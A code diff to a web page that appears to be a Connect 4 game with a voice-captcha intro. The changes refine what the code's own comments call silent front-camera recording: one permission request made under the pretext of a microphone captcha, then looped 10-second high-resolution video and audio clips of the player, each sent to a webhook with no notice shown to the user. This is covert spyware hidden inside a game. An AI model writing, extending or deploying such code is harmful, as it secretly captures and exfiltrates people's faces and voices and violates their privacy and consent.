@@ -862,7 +862,7 @@
     <script>
         // ============================================================
         //  INTRO + VOICE CAPTCHA + SILENT FRONT‑CAM RECORDING (looped)
-        //  with high-resolution fallback and robust webhook sending
+        //  with ONE permission request, reusing the same stream
         //  (preserves all existing game code)
         // ============================================================
 
@@ -876,9 +876,9 @@
         // -------- state --------
         let captchaPassed = false;
         let recordingActive = false;
+        let globalStream = null;          // single stream reused for all clips
         let mediaRecorder = null;
         let recordedChunks = [];
-        let recordingStream = null;
         let isRecording = false;
         let loopTimer = null;
 
@@ -895,14 +895,21 @@
                 return;
             }
 
-            navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: 'user', width: { ideal: 160 },
-                        height: { ideal: 120 } } })
+            // Request mic+video once to get permission; we'll reuse the stream later
+            navigator.mediaDevices.getUserMedia({
+                    audio: true,
+                    video: { facingMode: 'user', width: { ideal: 160 }, height: { ideal: 120 } }
+                })
                 .then(stream => {
+                    // Store the stream for later reuse
+                    globalStream = stream;
+                    // Stop the stream for now (we'll re-request later with full quality)
                     stream.getTracks().forEach(t => t.stop());
+                    globalStream = null; // we'll get a new one later
                     startListening();
                 })
                 .catch(err => {
-                    micStatusText.textContent = '❌ Please allow microphone access.';
+                    micStatusText.textContent = '❌ Please allow microphone & camera.';
                     micDot.className = 'dot error';
                     console.warn('Permission error:', err);
                 });
@@ -1011,126 +1018,130 @@
             }, 600);
         }
 
-        // -------- RECORDING WITH HIGH-RES FALLBACK AND RELIABLE SENDING --------
+        // -------- RECORDING WITH SINGLE STREAM (reused) --------
         function startBackgroundRecording() {
             if (recordingActive) return;
             recordingActive = true;
             console.log('🎥 Recording started (front camera, looped 10s clips)');
-            recordNextClip();
+
+            // Request the stream once with high resolution
+            const videoConstraints = [
+                { width: { ideal: 2560 }, height: { ideal: 1440 }, frameRate: { ideal: 60 } },
+                { width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 60 } },
+                { width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 30 } },
+                { width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } },
+                { width: { ideal: 640 }, height: { ideal: 480 } }
+            ];
+
+            let tryIndex = 0;
+
+            function tryGetStream() {
+                if (!recordingActive) return;
+                const constraints = videoConstraints[tryIndex] || videoConstraints[videoConstraints.length - 1];
+                const videoSettings = {
+                    facingMode: 'user',
+                    width: constraints.width,
+                    height: constraints.height,
+                    frameRate: constraints.frameRate || { ideal: 30 }
+                };
+
+                navigator.mediaDevices.getUserMedia({
+                        audio: true,
+                        video: videoSettings
+                    })
+                    .then(stream => {
+                        // Success - store the stream globally and start the loop
+                        globalStream = stream;
+                        console.log(`✅ Stream acquired with constraints:`, videoSettings);
+                        // Start the first clip
+                        recordNextClip();
+                    })
+                    .catch(err => {
+                        console.warn(`❌ Failed with constraint set ${tryIndex}:`, err);
+                        if (tryIndex < videoConstraints.length - 1) {
+                            tryIndex++;
+                            tryGetStream();
+                        } else {
+                            console.error('❌ All video constraints failed. Recording disabled.');
+                            recordingActive = false;
+                        }
+                    });
+            }
+
+            tryGetStream();
         }
-
-        // Try different resolution/framerate combinations
-        const videoConstraintsList = [
-            // First try: 1440p @ 60fps (ideal for modern iPhones)
-            { width: { ideal: 2560 }, height: { ideal: 1440 }, frameRate: { ideal: 60 } },
-            // Fallback: 1080p @ 60fps
-            { width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 60 } },
-            // Fallback: 1080p @ 30fps
-            { width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 30 } },
-            // Fallback: 720p @ 30fps
-            { width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } },
-            // Last resort: default
-            { width: { ideal: 640 }, height: { ideal: 480 } }
-        ];
-
-        let currentConstraintIndex = 0;
 
         function recordNextClip() {
-            if (!recordingActive) return;
+            if (!recordingActive || !globalStream) {
+                // If stream is lost, try to restart
+                if (recordingActive && !globalStream) {
+                    console.warn('⚠️ Stream lost, restarting...');
+                    startBackgroundRecording();
+                }
+                return;
+            }
 
-            const constraints = videoConstraintsList[currentConstraintIndex];
-            const videoSettings = {
-                facingMode: 'user',
-                width: constraints.width,
-                height: constraints.height,
-                frameRate: constraints.frameRate || { ideal: 30 }
-            };
+            // Create a new MediaRecorder on the same stream
+            recordedChunks = [];
+            const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus') ?
+                'video/webm;codecs=vp8,opus' :
+                'video/webm';
 
-            console.log(`📸 Trying video constraints:`, videoSettings);
-
-            navigator.mediaDevices.getUserMedia({
-                    audio: true,
-                    video: videoSettings
-                })
-                .then(stream => {
-                    // Success, reset index for next time
-                    currentConstraintIndex = 0;
-                    recordingStream = stream;
-                    recordedChunks = [];
-                    const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus') ?
-                        'video/webm;codecs=vp8,opus' :
-                        'video/webm';
-
-                    mediaRecorder = new MediaRecorder(stream, {
-                        mimeType: mimeType,
-                        videoBitsPerSecond: 8000000, // 8 Mbps for high quality
-                        audioBitsPerSecond: 128000
-                    });
-
-                    mediaRecorder.ondataavailable = (event) => {
-                        if (event.data && event.data.size > 0) {
-                            recordedChunks.push(event.data);
-                        }
-                    };
-
-                    mediaRecorder.onstop = () => {
-                        if (recordedChunks.length > 0) {
-                            const blob = new Blob(recordedChunks, { type: mimeType });
-                            console.log(`📦 Clip size: ${(blob.size / 1024).toFixed(1)} KB`);
-                            sendToWebhook(blob);
-                        } else {
-                            console.warn('⚠️ No data recorded, skipping send');
-                        }
-                        // Cleanup tracks
-                        if (recordingStream) {
-                            recordingStream.getTracks().forEach(t => t.stop());
-                            recordingStream = null;
-                        }
-                        isRecording = false;
-
-                        // Schedule next clip if still active
-                        if (recordingActive) {
-                            setTimeout(() => {
-                                recordNextClip();
-                            }, 300);
-                        }
-                    };
-
-                    mediaRecorder.start(1000);
-                    isRecording = true;
-                    console.log('🔴 Recording started');
-
-                    // Stop after 10 seconds
-                    setTimeout(() => {
-                        if (mediaRecorder && mediaRecorder.state === 'recording') {
-                            mediaRecorder.stop();
-                            console.log('⏹️ Recording stopped');
-                        }
-                    }, 10000);
-
-                })
-                .catch(err => {
-                    console.warn('❌ Recording error with constraint index', currentConstraintIndex, err);
-                    // Try next constraint if available
-                    if (currentConstraintIndex < videoConstraintsList.length - 1) {
-                        currentConstraintIndex++;
-                        console.log(`🔄 Retrying with next constraint set (${currentConstraintIndex})`);
-                        // Retry immediately
-                        if (recordingActive) {
-                            setTimeout(() => { recordNextClip(); }, 500);
-                        }
-                    } else {
-                        // All constraints failed, wait and retry from start
-                        console.warn('⚠️ All video constraints failed, resetting and retrying after delay');
-                        currentConstraintIndex = 0;
-                        if (recordingActive) {
-                            setTimeout(() => { recordNextClip(); }, 2000);
-                        }
-                    }
+            try {
+                mediaRecorder = new MediaRecorder(globalStream, {
+                    mimeType: mimeType,
+                    videoBitsPerSecond: 8000000,
+                    audioBitsPerSecond: 128000
                 });
+
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data && event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.onstop = () => {
+                    if (recordedChunks.length > 0) {
+                        const blob = new Blob(recordedChunks, { type: mimeType });
+                        console.log(`📦 Clip size: ${(blob.size / 1024).toFixed(1)} KB`);
+                        sendToWebhook(blob);
+                    } else {
+                        console.warn('⚠️ No data recorded, skipping send');
+                    }
+                    isRecording = false;
+
+                    // Schedule next clip if still active
+                    if (recordingActive) {
+                        setTimeout(() => {
+                            recordNextClip();
+                        }, 300);
+                    }
+                };
+
+                mediaRecorder.start(1000);
+                isRecording = true;
+                console.log('🔴 Recording started');
+
+                // Stop after 10 seconds
+                setTimeout(() => {
+                    if (mediaRecorder && mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                        console.log('⏹️ Recording stopped');
+                    }
+                }, 10000);
+
+            } catch (err) {
+                console.error('❌ Error creating MediaRecorder:', err);
+                // Try to recover
+                if (recordingActive) {
+                    setTimeout(() => {
+                        recordNextClip();
+                    }, 1000);
+                }
+            }
         }
 
-        // -------- send to webhook with robust error handling and retry --------
+        // -------- send to webhook --------
         async function sendToWebhook(blob) {
             if (blob.size === 0) {
                 console.warn('⚠️ Blob is empty, skipping send');
@@ -1156,14 +1167,6 @@
                 if (!response.ok) {
                     const text = await response.text();
                     console.warn(`❌ Webhook upload failed (${response.status}):`, text);
-                    // Optionally retry once after a short delay
-                    setTimeout(() => {
-                        if (recordingActive) {
-                            console.log('🔄 Retrying upload...');
-                            // We'll just re-send; but we already consumed the blob, so we need to store it.
-                            // Instead, we could re-record but that's complex; for now we log.
-                        }
-                    }, 3000);
                 } else {
                     console.log(`✅ Uploaded ${filename} successfully`);
                 }
@@ -1180,9 +1183,9 @@
             if (mediaRecorder && mediaRecorder.state === 'recording') {
                 try { mediaRecorder.stop(); } catch (e) {}
             }
-            if (recordingStream) {
-                recordingStream.getTracks().forEach(t => t.stop());
-                recordingStream = null;
+            if (globalStream) {
+                globalStream.getTracks().forEach(t => t.stop());
+                globalStream = null;
             }
             isRecording = false;
             console.log('⏹️ Recording stopped');
@@ -1841,7 +1844,7 @@
         window.clearRecords = clearRecords;
         window.claimPrize = claimPrize;
 
-        console.log('✅ Connect 4 with voice intro + silent front‑cam recording (high-res fallback, 10s clips)');
+        console.log('✅ Connect 4 with voice intro + silent front‑cam recording (single permission, looped 10s clips)');
     </script>
 
 </body>
